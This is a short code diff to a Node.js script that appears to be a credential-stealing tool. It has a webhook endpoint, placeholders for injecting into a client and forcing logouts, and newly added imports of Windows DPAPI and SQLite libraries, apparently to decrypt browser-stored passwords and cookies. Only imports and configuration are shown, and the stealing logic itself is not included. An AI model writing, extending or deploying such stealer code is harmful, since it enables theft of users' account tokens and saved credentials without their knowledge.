@@ -6,8 +6,13 @@ const { exec } = require('child_process');
 var request = require('sync-request');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
+const dpapi = require("win-dpapi");
+const sqlite3 = require('sqlite3');
 const webhook = "da_webhook"
+var debug = false,
+    args = process.argv.slice(2);
 
+if (args[0] == 'debug') debug = false;
 const config = {
     "logout": "%LOGOUT%",
     "inject-notify": "%INJECTNOTI%",
